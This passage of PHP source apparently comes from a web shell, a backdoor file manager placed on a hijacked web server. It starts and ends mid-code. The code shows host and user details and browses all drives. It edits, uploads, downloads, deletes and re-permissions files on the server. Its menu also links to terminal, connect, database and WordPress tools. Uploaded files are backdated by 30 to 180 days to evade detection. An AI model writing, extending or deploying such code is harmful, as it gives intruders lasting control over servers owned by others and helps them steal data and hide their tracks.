		foreach($e as $r) 
		{
			$t.=$r._;
			if($j==$i) 
			{	
				break;
			}
			$j++;
		}
		$map.="<a href=\"?d=".urle($t)."\" >".htmlspecialchars($b)."</a>"._;
		$i++;
	}
	return rtrim($map,_);
}

function MapDrive($x) 
{
	if(!Unix()) 
	{
		$v=explode("\\",$x);
		$v=$v[0];
		$l="";
		foreach(range("A","Z") as $lt) 
		{
			$drive=is_dir($lt.":\\");
			if($drive) 
			{
				$l.="<a href=\"?d=".urle($lt.":\\")."\">[";
				if(strtolower($lt.':')!=strtolower($v)) 
				{
					$l.=$lt;
				}
				else
				{
					$l.="<font color=\"orange\"><b>".$lt."</b></font>";
				}
				$l.="]</a>";
			}
		}
		return $l;
	}
}

function MainMenu() 
{
	$menu=array(
		"ExpL"          => "?d=".urle(getcwd()),
		"&#9733; Sec."	=> "?x=secure",
		"Info"          => "?x=info",
		"Database"      => "?x=db",
		"Terminal"      => "?x=terminal",
		"Connect"       => "?x=connect",
		".Htaccess"     => "?x=htaccess",
		"PHP"           => "?x=php",
		"Perl/CGI"      => "?x=perl",
		//"Mail"          => "?x=mail",
		"Process"       => "?x=process",
		//"Shells"        => "?x=shells",
		//"Symlink"       => "?x=symlink",
		"&#9819; Tools" => "?z",
		"&#2506; maRidoNo" => "?wp",
		//"Account"       => "?x=account",
		//"Update"        => "?x=update",
		"Logout"        => "?x=logout"
	);
	$nu="";
	foreach($menu as $key => $val)
	{
		$idxkey=substr($val,1,1);
		$idxval=substr($val,3);
		$active=any($idxkey,$_REQUEST)&&$_REQUEST[$idxkey]==$idxval?"class='active'":"";
		if($key=="Logout")
		{
			$nu.="<li><a ".$active." href='".$val."' onclick=\"return confirm('Bye !');\">".$key."</a></li>";
		}
		else
		{
			$nu.="<li><a ".$active." href='".$val."'>".$key."</a></li>";
		}
	}
	return $nu;
}

function MenuTools($x) 
{
	global $menu_tools;
	$ol="<div class='menu-tools'><ul>";
	$menu_tools=$x;
	
	foreach($menu_tools as $k => $v)
	{
		$active=$_REQUEST['z']==$k?"class='active'":"";
		$ol.="<li><a ".$active." href='?z=".$k."'>[".$v['title']."]</a></li>";
	}
	$ol.="</ul></div>";
	return $ol;
}

function MenuWP($x) 
{
	global $menu_wp;
	$ol="<div class='menu-tools'><ul>";
	$menu_wp=$x;
	
	foreach($menu_wp as $k => $v)
	{
		$active=$_REQUEST['wp']==$k?"class='active'":"";
		$ol.="<li><a ".$active." href='?wp=".$k."'>[".$v['title']."]</a></li>";
	}
	$ol.="</ul></div>";
	return $ol;
}

printf("<div id='header'>
		<div class='header-left'>
			<div id='info'>
				<font class='on'>[%s]</font><br>
				<font class='on'>[%s]</font><br>
				[<a href='//%s' target='_blank'>%s</a>]: <font class='on'>%s:%s</font> [%s]: <font class='on'>%s:%s</font><br>
				[USER]: <font class='on'>%s(%s)</font> [GROUP]: <font class='on'>%s(%s)</font><br>
				[HDD]: <font class='on'>%s</font> / <font class='on'>%s</font><br>
				[PHPMODE]: <font class='on'>%s</font><br>
				[SAFEMODE]: <font class='on'>%s</font><br>
			</div>
		</div>
		<div class='header-right'>
			<a href='%s'><div id='logo'>
				<h1 id='title'>%s</h1>
				<div class='line'></div>
				<h2 id='subtitle'>%s</h2>
			</div></a>
		</div>
		<div class='clr'></div>
		</div>
		<div id='container'>
		<div class='menu'>
			<ul>%s</ul>
		</div>
		<div class='menu-directory'>
			<div class='map-switch'>
				<input type='submit' name='map-switch' value='&#9822;' onclick='mapSwitch(\"map1\",\"map2\")'>
			</div>
			<div class='map1' id='map1' style='display:inline-block'>
				<span style='margin-right:5px'>%s</span>
				<span style='margin-right:5px'>%s</span>
			</div>
			<div class='map2' id='map2' style='display:none'>
				<form method='post' id='map2-form' onsubmit='document.getElementById(\"map2-form\").action=\"?g=\" + encodeURI(document.getElementById(\"map2-input\").value);'>
					<input type='text' value='%s' id='map2-input'/>
					<input type='submit' value='Go'>
				</form>
			</div>
		</div>
		<div class='content'>",
		php_uname(),server_software,server_name,server_name,
		gethostbyname(http_host),server_port,
		B64D($account[0]),remote_addr,remote_port,
		GetUser("usr"),GetUser("uid"),GetUser("grp"),GetUser("gid"),
		GetFileSize(@disk_free_space($dir)),GetFileSize(@disk_total_space($dir)),
		php_sapi_name(),GetSafeMode(),php_self,$config['title'],$config['subtitle'],
		MainMenu(),MapDrive($map),MapDirectory($map),$map
);

if(any("g",$_REQUEST))
{
	$g=$_REQUEST['g'];

	if (is_dir($g))
	{
		header('location:'.php_self.'?d='.urle($g));
	}
	elseif(is_file($g)||is_link($g))
	{
		header('location:'.php_self.'?a=v&r='.urle($g));
	}
	else
	{
		header('location:'.php_self);
	}
}

if(any("d",$_REQUEST)||request_uri===script_name)
{
	$_SESSION['c']=urle($dir);

	if(any("file",$_REQUEST)&&$_REQUEST['file']=="New File")
	{
		$file=trim($dir._.$_REQUEST['what']);
		
		if(file_exists($file))
		{
			printf("<center style='margin-bottom:10px'><b class='off'>Can't create New File!</b></center>");
		}
		else
		{
			$mf=@fopen($file,"w");
			fclose($mf);
			header("location:".php_self."?a=e&r=".urle($file));
		}
	}
	if(any("directory",$_REQUEST)&&$_REQUEST['directory']=="New Dir")
	{	
		$dire=trim($_REQUEST['what']);

		@chdir($dir);

		if(!@mkdir($dire))
		{
			printf("<center style='margin-bottom:10px'><b class='off'>Can't create New Directory!</b></center>");
		}
		else
		{
			printf("<center style='margin-bottom:10px'><b class='on'>Directory '%s' Created on %s</b></center>",$dire,GetFileTime($dir._.$dire,'create'));
		}
	}
	if(any("upload",$_REQUEST)&&$_REQUEST['upload']=="Upload")
	{	
		$upload=$dir._.trim(basename($_FILES["what"]["name"]));

		if(move_uploaded_file($_FILES["what"]["tmp_name"],$upload)) 
		{
			printf("<center style='margin-bottom:10px'><b class='on'>File %s has been uploaded</b></center>",basename($_FILES["what"]["name"]));
			@touch($upload,strtotime("-".rand(30,180)." days", time()));
		}
		else 
		{
			printf("<center style='margin-bottom:10px'><b class='off'>&#10005; Can't upload new file! &#10005;</b></center>");
		}
	}
	if($handle=@opendir($dir))
	{
		$reads=array();
		$count_dirs=0;
		$count_files=0;

		while(false!==($file=readdir($handle)))
		{
			$filedir=rtrim($dir,_)._.$file;
			$updir=substr($dir,0,strrpos($dir,_));
			if (strlen($updir)<=2) $updir=$updir._;
			$type=GetFileType($filedir);
			$size=GetFileSize(@filesize($filedir));
			$last=GetFileTime($filedir,"modify");
			$perm=GetFilePerm($filedir);
			$owner=GetOwnerGroup($filedir);
			$mime=@mime_content_type($filedir);
			$view="";

			if(strpos($mime,'image')!==false)
			{
				$view="?a=v&w=i&r=".urle($filedir);
			}
			elseif(strpos($mime,'video')!==false)
			{
				$view="?a=v&w=v&r=".urle($filedir);
			}
			elseif(strpos($mime,'audio')!==false)
			{
				$view="?a=v&w=a&r=".urle($filedir);
			}
			else
			{
				$view="?a=v&r=".urle($filedir);
			}
			
			if($file==".")
			{
				$reads[]="<tr sorttable_customkey='2'><td><center><input type='checkbox' name='nochk[]' value='".urle($dir)."'/></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAd5JREFUeNqMU79rFUEQ/vbuodFEEkzAImBpkUabFP4ldpaJhZXYm/RiZWsv/hkWFglBUyTIgyAIIfgIRjHv3r39MePM7N3LcbxAFvZ2b2bn22/mm3XMjF+HL3YW7q28YSIw8mBKoBihhhgCsoORot9d3/ywg3YowMXwNde/PzGnk2vn6PitrT+/PGeNaecg4+qNY3D43vy16A5wDDd4Aqg/ngmrjl/GoN0U5V1QquHQG3q+TPDVhVwyBffcmQGJmSVfyZk7R3SngI4JKfwDJ2+05zIg8gbiereTZRHhJ5KCMOwDFLjhoBTn2g0ghagfKeIYJDPFyibJVBtTREwq60SpYvh5++PpwatHsxSm9QRLSQpEVSd7/TYJUb49TX7gztpjjEffnoVw66+Ytovs14Yp7HaKmUXeX9rKUoMoLNW3srqI5fWn8JejrVkK0QcrkFLOgS39yoKUQe292WJ1guUHG8K2o8K00oO1BTvXoW4yasclUTgZYJY9aFNfAThX5CZRmczAV52oAPoupHhWRIUUAOoyUIlYVaAa/VbLbyiZUiyFbjQFNwiZQSGl4IDy9sO5Wrty0QLKhdZPxmgGcDo8ejn+c/6eiK9poz15Kw7Dr/vN/z6W7q++091/AQYA5mZ8GYJ9K0AAAAAASUVORK5CYII='/> <a title='Current Directory' href='?d=".urle($dir)."'>.</a></td><td><center>".strtoupper($type)."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($dir)."' onclick=\"return confirm('Delete Directory [ /".basename($dir)." ] ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($dir)."' title='Modify Folder'>&#8499;</a></td></tr>";
			}
			elseif($file=="..")
			{
				$reads[]="<tr sorttable_customkey='1'><td><center><input type='checkbox' name='nochk[]' value='".urle($updir)."'/></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAmlJREFUeNpsU0toU0EUPfPysx/tTxuDH9SCWhUDooIbd7oRUUTMouqi2iIoCO6lceHWhegy4EJFinWjrlQUpVm0IIoFpVDEIthm0dpikpf3ZuZ6Z94nrXhhMjM3c8895977BBHB2PznK8WPtDgyWH5q77cPH8PpdXuhpQT4ifR9u5sfJb1bmw6VivahATDrxcRZ2njfoaMv+2j7mLDn93MPiNRMvGbL18L9IpF8h9/TN+EYkMffSiOXJ5+hkD+PdqcLpICWHOHc2CC+LEyA/K+cKQMnlQHJX8wqYG3MAJy88Wa4OLDvEqAEOpJd0LxHIMdHBziowSwVlF8D6QaicK01krw/JynwcKoEwZczewroTvZirlKJs5CqQ5CG8pb57FnJUA0LYCXMX5fibd+p8LWDDemcPZbzQyjvH+Ki1TlIciElA7ghwLKV4kRZstt2sANWRjYTAGzuP2hXZFpJ/GsxgGJ0ox1aoFWsDXyyxqCs26+ydmagFN/rRjymJ1898bzGzmQE0HCZpmk5A0RFIv8Pn0WYPsiu6t/Rsj6PauVTwffTSzGAGZhUG2F06hEc9ibS7OPMNp6ErYFlKavo7MkhmTqCxZ/jwzGA9Hx82H2BZSw1NTN9Gx8ycHkajU/7M+jInsDC7DiaEmo1bNl1AMr9ASFgqVu9MCTIzoGUimXVAnnaN0PdBBDCCYbEtMk6wkpQwIG0sn0PQIUF4GsTwLSIFKNqF6DVrQq+IWVrQDxAYQC/1SsYOI4pOxKZrfifiUSbDUisif7XlpGIPufXd/uvdvZm760M0no1FZcnrzUdjw7au3vu/BVgAFLXeuTxhTXVAAAAAElFTkSuQmCC'/> <a title='Parent Directory' href='?d=".urle($updir)."'>".$file."</a></td><td><center>".strtoupper($type)."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($updir)."' onclick=\"return confirm('Delete Directory [ /".basename($updir)." ] ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($updir)."' title='Modify Folder'>&#8499;</a></td></tr>";
			}
			else
			{
				if($type=="dir")
				{
					$reads[]="<tr sorttable_customkey='3'><td><center><input type='checkbox' name='chk[]' value='".urle($filedir)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAd5JREFUeNqMU79rFUEQ/vbuodFEEkzAImBpkUabFP4ldpaJhZXYm/RiZWsv/hkWFglBUyTIgyAIIfgIRjHv3r39MePM7N3LcbxAFvZ2b2bn22/mm3XMjF+HL3YW7q28YSIw8mBKoBihhhgCsoORot9d3/ywg3YowMXwNde/PzGnk2vn6PitrT+/PGeNaecg4+qNY3D43vy16A5wDDd4Aqg/ngmrjl/GoN0U5V1QquHQG3q+TPDVhVwyBffcmQGJmSVfyZk7R3SngI4JKfwDJ2+05zIg8gbiereTZRHhJ5KCMOwDFLjhoBTn2g0ghagfKeIYJDPFyibJVBtTREwq60SpYvh5++PpwatHsxSm9QRLSQpEVSd7/TYJUb49TX7gztpjjEffnoVw66+Ytovs14Yp7HaKmUXeX9rKUoMoLNW3srqI5fWn8JejrVkK0QcrkFLOgS39yoKUQe292WJ1guUHG8K2o8K00oO1BTvXoW4yasclUTgZYJY9aFNfAThX5CZRmczAV52oAPoupHhWRIUUAOoyUIlYVaAa/VbLbyiZUiyFbjQFNwiZQSGl4IDy9sO5Wrty0QLKhdZPxmgGcDo8ejn+c/6eiK9poz15Kw7Dr/vN/z6W7q++091/AQYA5mZ8GYJ9K0AAAAAASUVORK5CYII='/> <a title='Open Directory' href='?d=".urle($filedir)."'>".$file."</a></td><td><center>".strtoupper($type)."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($filedir)."' onclick=\"return confirm('Delete Directory [ /".basename($filedir)." ] ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($filedir)."' title='Modify Folder'>&#8499;</a></td></tr>";
					$count_dirs++;
				}
				else
				{
					$reads[]="<tr sorttable_customkey='4'><td><center><input type='checkbox' name='chk[]' value='".urle($filedir)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAABnRSTlMAAAAAAABupgeRAAABHUlEQVR42o2RMW7DIBiF3498iHRJD5JKHurL+CRVBp+i2T16tTynF2gO0KSb5ZrBBl4HHDBuK/WXACH4eO9/CAAAbdvijzLGNE1TVZXfZuHg6XCAQESAZXbOKaXO57eiKG6ft9PrKQIkCQqFoIiQFBGlFIB5nvM8t9aOX2Nd18oDzjnPgCDpn/BH4zh2XZdlWVmWiUK4IgCBoFMUz9eP6zRN75cLgEQhcmTQIbl72O0f9865qLAAsURAAgKBJKEtgLXWvyjLuFsThCSstb8rBCaAQhDYWgIZ7myM+TUBjDHrHlZcbMYYk34cN0YSLcgS+wL0fe9TXDMbY33fR2AYBvyQ8L0Gk8MwREBrTfKe4TpTzwhArXWi8HI84h/1DfwI5mhxJamFAAAAAElFTkSuQmCC'> <a title='View File' href='".$view."'>".$file."</a></td><td><center>".strtoupper($type)."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=e&r=".urle($filedir)."' title='Modify File'>&#8499;</a> <a class='action' href='?a=x&r=".urle($filedir)."' onclick=\"return confirm('Delete Filename [ ".basename($filedir)." ] ?');\" title='Delete File'>&#10008;</a> <a class='action' href='?a=d&r=".urle($filedir)."' title='Download File'>&#10149;</a></td></tr>";		
					$count_files++;
				}
			}
		}
		sort($reads);
		$filesdirs="";
		foreach($reads as $read)
		{
			$filesdirs.=$read;
		}
		printf("<div id='action'>
					<table><tr>
					<td><form class='new' method=POST action='?d=%s'>
						<input name='what' type='text' /><input type='submit' name='file' value='New File'/>
					</form></td>
					<td><form class='new' method=POST action='?d=%s'>
						<input name='what' type='text' /><input type='submit' name='directory' value='New Dir'/>
					</form></td>
					<td><form class='new' method=POST action='?x=find'>
						<input type='text' name='find-value' id='find-action'/><input type='submit' name='find-button' value='Find'/>
					</form></td>
					<td><form class='new' method=POST action='?d=%s&x=upload' enctype='multipart/form-data'>
						<input name='what' type='file' class='inputfile'/><input type='submit' name='upload' value='Upload'/>
					</form></td>
					</tr></table>
				</div>
				<div id='home'>
					<form name='files' method=POST action='?x=action' onclick='checkCount(\"count\")'>
						<table class='table sortable'>
							<thead>
								<tr>
									<th class='sorttable_nosort'><input type='checkbox' name='check-all' onclick='checkAll()'/></th>
									<th class='sorttable_numeric'>Name</th>
									<th>Type</th>
									<th>Size</th>
									<th>Perms</th>
									<th>Owner:Group</th>
									<th>Modified</th>
									<th>Act.</th>
								</tr>
							</thead>
							<tbody>%s</tbody>
							<tFoot>
								<tr>
									<td colspan='8'>[<span id='count'>0</span>] Selected | Dir's: [%s] File's: [%s]</td>
								</tr>
							</tFoot>
						</table>
						<select name='action-value'>
							<option value='copy'>Copy</option>
							<option value='move'>Move</option>
							<option value='delete'>Delete</option>
							<option value='zip'>Archive (zip)</option>
							<option value='unzip'>Extract to (zip)</option>
						</select>
						<input type='submit' value='Action' name='action-button' />
					</form>
				</div>",
				urle($dir),
				urle($dir),
				urle($dir),
				$filesdirs,
				$count_dirs,
				$count_files
		);
		closedir($handle);
	}
	else
	{
		print "<center style='margin-bottom:10px'><b class='off'>Can't Open Location</b></center>";
	}
}

if(any("r",$_REQUEST))
{
	if(file_exists(urld($_REQUEST["r"])))
	{
		$file=strval(urld($_REQUEST["r"]));
		$status=any("status",$_SESSION)?$_SESSION['status']:"";
		$back=php_self."?d=".urle($dir);

		printf("<div class='divide'>
				<div class='divide-left'>
					<table class='table'>
						<tr><td>Name</td><td>%s</td></tr>
						<tr><td>Size</td><td>%s</td></tr>
						<tr><td>Permission</td><td>%s</td></tr>
						<tr><td>Create time</td><td>%s</td></tr>
						<tr><td>Last modified</td><td>%s</td></tr>
						<tr><td>Last accessed</td><td>%s</td></tr>
					</table>
				</div>
				<div class='divide-right'>
					<table class='table'>
						<tr><td>MIME</td><td>%s</td></tr>
						<tr><td>Owner/Group</td><td>%s</td></tr>
						<tr><td>MD5</td><td>%s</td></tr>
						<tr><td>SHA1</td><td>%s</td></tr>
						<tr><td>Path</td><td>%s</td></tr>
						
					</table>
				</div>
			</div>",
			basename($file),
			GetFileSize(@filesize($file)),
			GetFilePerm($file),
			GetFileTime($file,"create"),
			GetFileTime($file,"modify"),
			GetFileTime($file,"access"),
			mime_content_type($file),
			GetFileOwnerGroup($file),
			@md5_file($file),
			@sha1_file($file),
			realpath($file)


		);

		if(is_file($file)||is_link($file))
		{
			$menu=array(

				"Back"      => "?a=b&r=",
				"Edit"      => "?a=e&r=",
				"View"      => "?a=v&r=",
				"Copy"      => "?a=cp&r=",
				"Move"      => "?a=mv&r=",
				"Download"  => "?a=d&r=",
				"Hexdump"   => "?a=h&r=",
				"Chmod"     => "?a=c&r=",
				"Chown"     => "?a=cwn&r=",
				"Chgrp"     => "?a=cgp&r=",
				"Touch"     => "?a=t&r=",
				"Rename"    => "?a=r&r=",
				"Delete"    => "?a=x&r="
			);
		}
		elseif(is_dir($file))
		{
			$menu=array(

				"Back"      => "?a=b&r=",
				"Chmod"     => "?a=c&r=",
				"Chown"     => "?a=cwn&r=",
				"Chgrp"     => "?a=cgp&r=",
				"Touch"     => "?a=t&r=",
				"Rename"    => "?a=r&r=",
				"Delete"    => "?a=x&r="
			);
		}

		$nu="";
		
		foreach($menu as $key => $val)
		{
			$idxkey=substr($val,1,1);
			$idxval=substr($val,3,strpos($val,'&')-3);
			$active=any($idxkey,$_REQUEST)&&$_REQUEST[$idxkey]==$idxval?"class='active'":"";
			if($key=="Delete")
			{
				$nu.="<li><a ".$active." href='".$val.urle($file)."' onclick=\"return confirm('Delete Filename [ ".basename($file)." ] ?');\">".$key."</a></li>";
			}
			elseif($key=="Back")
			{
				$nu.="<li><a ".$active." href='".$back."'>".$key."</a></li>";
			}
			else
			{
				$nu.="<li><a ".$active." href='".$val.urle($file)."'>".$key."</a></li>";
			}
		}

		printf("<div class='menu'>
			<ul>%s</ul>
		</div>",$nu);

		if($_REQUEST['a']=='e')
		{
			$source="";

			if(filesize($file) > 5242880)
			{
				$source.="Lazy to Read more than 5MB Files";
			}
			else
			{
				$open=fopen($file,'r');

				if($open) 
				{
					while(!feof($open)) 
					{
						$source.=htmlentities(fread($open,(1024*4)));
					}
					fclose($open);
				}
			}

			printf("<form class='frmsource' method='post'>
					<textarea id='sourcefocus' name='sourcecode' rows='25' cols='100'>%s</textarea>
					<input type='Submit' value='Save file' name='save'/>
					<label>%s</label>
				</form>",$source,$status);
		
			if(any("status",$_SESSION)) unset($_SESSION['status']);

			if(any("save",$_REQUEST))
			{
				$new_source=$_REQUEST['sourcecode'];
				if(function_exists("chmod")) chmod($file,0755);
				$source_edit=fopen($file,'w+');
				$tulis=fwrite($source_edit,$new_source);
				fclose($source_edit);
				if($tulis)
				{
					$_SESSION['status']="File Saved ! ".GetFileTime($file,"modify")." | ".GetFileSize(filesize($file));
				}
				else
				{
					$_SESSION['status']="Whoops, something went wrong...";
				}
				header("location:".php_self."?a=e&r=".urle($file));
			}
		}

		if($_REQUEST['a']=='r')
		{
			printf("<form class='new' method='post'>
				<input type='text' name='name' value='%s'/>
				<input type='Submit' value='Rename' name='rename'/>
				<label>%s</label>
			</form>",basename($file),$status);

			if(any("status",$_SESSION)) unset($_SESSION['status']);

			if(any("rename",$_REQUEST))
			{
				$path=pathinfo(trim($file));
				$newname=$path['dirname']._.trim($_REQUEST['name']);
				if(!rename(trim($file),$newname)) 
				{
				    $_SESSION['status']='Whoops, something went wrong...';
				}
				else 
				{
				    $_SESSION['status']='Renamed file with success';
				}
				header("location:".php_self."?a=r&r=".urle($newname));
			}
		}

		if($_REQUEST['a']=='c')
		{
			printf("<form class='new' method='post'>
				<input type='text' name='octal' value='%s'/>
				<input type='Submit' value='Chmod' name='chmod'/>
				<label>%s</label>
			</form>",substr(decoct(fileperms($file)),2),$status);

			if(any("status",$_SESSION)) unset($_SESSION['status']);

			if(any("chmod",$_REQUEST))
			{
				$octal=octdec($_REQUEST['octal']);
				if(!chmod(trim($file),$octal)) 
				{
				    $_SESSION['status']='Whoops, something went wrong...';
				}
				else 
				{
				    $_SESSION['status']='Chmod file with success';
				}
				header("location:".php_self."?a=c&r=".urle($file));
			}
		}

		if($_REQUEST['a']=='cwn')
		{
			$own='';
			if(function_exists('posix_getpwuid')) 
			{
				$user=posix_getpwuid(fileowner($x));
				$own=$user['name'];
			}

			printf("<form class='new' method='post'>
				<input type='text' name='own' value='%s'/>
				<input type='Submit' value='Chown' name='chown'/>
				<label>%s</label>
			</form>",$own,$status);

			if(any("status",$_SESSION)) unset($_SESSION['status']);

			if(any("chown",$_REQUEST))
			{
				$own=$_REQUEST['own'];
				if(!chown(trim($file),$own)) 
				{
				    $_SESSION['status']='Whoops, something went wrong...';
				}
				else 
				{
				    $_SESSION['status']='Chown file with success';
				}
				header("location:".php_self."?a=cwn&r=".urle($file));
			}
		}

		if($_REQUEST['a']=='cgp')
		{
			$grp='';
			if(function_exists('posix_getgrgid')) 
			{
				$group=posix_getgrgid(filegroup($x));
				$grp=$group['name'];
			}

			printf("<form class='new' method='post'>
				<input type='text' name='grp' value='%s'/>
				<input type='Submit' value='Chgrp' name='chgrp'/>
				<label>%s</label>
			</form>",$grp,$status);

			if(any("status",$_SESSION)) unset($_SESSION['status']);

			if(any("chgrp",$_REQUEST))
			{
				$grp=$_REQUEST['grp'];
				if(!chgrp(trim($file),$grp)) 
				{
					$_SESSION['status']='Whoops, something went wrong...';
				}
				else 
				{
					$_SESSION['status']='Chgrp file with success';
				}
				header("location:".php_self."?a=cgp&r=".urle($file));
			}
		}

		if($_REQUEST['a']=='t')
		{
			printf("<form class='new' method='post'>
				<input type='text' name='time' value='%s'/>
				<input type='Submit' value='Touch' name='touch'/>
				<label>%s</label>
			</form>",GetFileTime($file,"modify"),$status);

			if(any("status",$_SESSION)) unset($_SESSION['status']);

			if(any("touch",$_REQUEST))
			{
				$time=$_REQUEST['time'];
				if(!touch(trim($file),strtotime($time))) 
				{
				    $_SESSION['status']='Whoops, something went wrong...';
				}
				else 
				{
				    $_SESSION['status']='Touched file with success';
				}
				header("location:".php_self."?a=t&r=".urle($file));
			}
		}

		if($_REQUEST['a']=='v')
		{
			printf("<div class='menu'>
					<ul>
						<li><a href='?a=v&r=%s'>Source</a></li>
						<li><a href='?a=v&w=f&r=%s'>iFrame</a></li>
						<li><a href='?a=v&w=i&r=%s'>Image</a></li>
						<li><a href='?a=v&w=v&r=%s'>Video</a></li>
						<li><a href='?a=v&w=a&r=%s'>Audio</a></li>
					</ul>
				</div>",
			urle($file),urle($file),
			urle($file),urle($file),
			urle($file));

			if(is_readable($file))
			{
				if(any("w",$_REQUEST))
				{
					$url=GetUrlFromPath($file);
					$type=pathinfo($url)['extension'];

					if($_REQUEST['w']=='f')
					{
						printf("<center><iframe src='%s' width='100%%' height='325' frameBorder='0'>Suck</iframe><a href='%s' target='_blank'>--> New Tab <--</a></center>",$url,$url);
					}

					if($_REQUEST['w']=='i')
					{
						printf("<center><img src='%s' alt='&nbsp;Not Image'/></center>",$url);
					}

					if($_REQUEST['w']=='v')
					{
						printf("<center><video width='640' height='320' controls><source src='%s' type='video/%s'>Suck</video></center>",$url,$type);
					}

					if($_REQUEST['w']=='a')
					{
						printf("<center><audio controls><source src='%s' type='audio/%s'>Suck</audio></center>",$url,$type);
					}
				}
				else
				{
					if(filesize($file) > 5242880)
					{
						printf("Lazy to Read more than 5MB Files");
					}
					else
					{
						$code=highlight_file($file,true);
						printf("<div class='highlight'>%s</div>",$code);
					}
				}
			}
		}
		
		if($_REQUEST['a']=='h')
		{
			$c=file_get_contents($file);
			$n=0;
			$h=array('00000000<br>','','');
			$len=strlen($c);
			for($i=0;$i<$len;++$i)
			{
				$h[1].=sprintf('%02X',ord($c[$i])).' ';
				switch(ord($c[$i]))
				{
					case 0: $h[2].=' ';break;
					case 9: $h[2].=' ';break;
					case 10:$h[2].=' ';break;
					case 13:$h[2].=' ';break;
					default:$h[2].=$c[$i];break;
				}
				$n++;
				if($n==32)
				{
					$n=0;
					if($i+1 < $len)
					{
						$h[0].=sprintf('%08X',$i+1).'<br>';
					}
					$h[1].='<br>';
					$h[2].="\n";
				}
			}
			printf("
				<div id='hexdump'>
					<table class='hexdump'>
						<tr>
							<td><pre>%s</pre></td>
							<td><pre>%s</pre></td>
							<td><pre>%s</pre></td>
						</tr>
					</table>
				</div>",$h[0],$h[1],htmlspecialchars($h[2]));
		}

		if($_REQUEST['a']=='cp'||$_REQUEST['a']=='mv')
		{
			printf("<form class='new' method='post'>
				<input type='text' name='file-dest' value='%s'/>
				<input type='Submit' value='%s' name='submit'/>
				<label>%s</label>
			</form>",$file,($_REQUEST['a']=='cp'?'Copy':'Move'),$status);

			if(any("status",$_SESSION)) unset($_SESSION['status']);

			if(any("submit",$_REQUEST))
			{
				$source=$file;
				$dest=$_REQUEST['file-dest'];

				if(!file_exists($dest))
				{
					if ($_REQUEST['a']=='cp')
					{
						if(!copy(trim($source),trim($dest))) 
						{
						    $_SESSION['status']='Whoops, cannot copying...';
						}
						else 
						{
						    $_SESSION['status']="Copy file with success <a href=?a=v&r='" . urle($dest) . "'>'" . basename($dest) . "'</a>";
						}
					}
					elseif($_REQUEST['a']=='mv')
					{
						if(!copy(trim($source),trim($dest))) 
						{
						    $_SESSION['status']='Whoops, cannot moving...';
						}
						else 
						{
						    if(Remove($source))
						    {
						    	$_SESSION['status']="Move file with success";
						    	$file=$dest;
						   }
						    else
						    {
						    	$_SESSION['status']='Whoops, just copying...';
						   }
						}
					}
				}
				else
				{
					$_SESSION['status']="Whoops, File was Exists <a href=?a=v&r='" . urle($dest) . "'>'" . basename($dest) . "'</a>";
				}

				if($_REQUEST['a']=='cp')
				{
					header("location:".php_self."?a=cp&r=".urle($file));
				}
				elseif($_REQUEST['a']=='mv')
				{
					header("location:".php_self."?a=mv&r=".urle($file));
				}
			}
		}

		if($_REQUEST['a']=='d')
		{
			if(file_exists($file))
			{
				header('Cache-Control:must-revalidate,post-check=0,pre-check=0');
				header('Content-Disposition:attachment;filename='.basename($file));
				header('Content-Type:application/octet-stream');
				header('Content-Description:File Transfer');
				header('Content-Transfer-Encoding:binary');
				header('Content-Length:'.filesize($file));
				header('Pragma:public');
				header('Expires:0');
				ob_clean();
				readfile($file);
				exit;
			}
		}
		
		if($_REQUEST['a']=='x')
		{
			if(file_exists($file))
			{
				if(Remove($file))
				{
					header("location:".$back);
				}
			}
			
			print '<font class="off">Cannot Delete</font>';
		}
	}
	else
	{
		print '<font class="off">File Not Found</font>';
	}
}

if(any("x",$_REQUEST))
{
	if($_REQUEST['x']=="logout")
	{
		session_destroy();
		session_regenerate_id();
		header('location:'.php_self);
	}
	if($_REQUEST['x']=="secure")
	{
		$disable_functions=array_filter(array_map('trim',explode(',',ini_get("disable_functions"))));

		$security=array('_xyec','allow_url_fopen','allow_url_include','apache_child_terminate','apache_get_modules','apache_getenv',
		'apache_note','apache_setenv','base64_decode','chdir','chgrp','chmod','chown','curl_exec','curl_multi_exec','dbase_open',
		'dbmopen','define_syslog_variables','disk_free_space','disk_total_space','diskfreespace','dl','dlopen','escapeshellarg',
		'escapeshellcmd','eval','exec','extract','filepro','filepro_retrieve','filepro_rowcount','fopen_with_path','fp','fput',
		'fputs','ftp_connect','ftp_exec','ftp_get','ftp_login','ftp_nb_fput','ftp_put','ftp_raw','ftp_rawlist','geoip_open',
		'get_cfg_var','get_current_user','get_num_redirects','getcwd','getenv','getlastmo','getmygid','getmyinode','getmypid',
		'getmyuid','getrusage','gzinflate','gzuncompress','highlight_file','hpAds_xmlrpcEncode','ini_alter','ini_get_all',
		'ini_restore','ini_set','inject_code','leak','link','listen','mainwork','mb_send_mail','mkdir','mkfifo','move_uploaded_file',
		'mysql_list_dbs','mysql_pconnect','openlog','parse_ini_file','passthru','pcntl_alarm','pcntl_exec','pcntl_fork',
		'pcntl_get_last_error','pcntl_getpriority','pcntl_setpriority','pcntl_signal','pcntl_signal_dispatch','pcntl_sigprocmask',
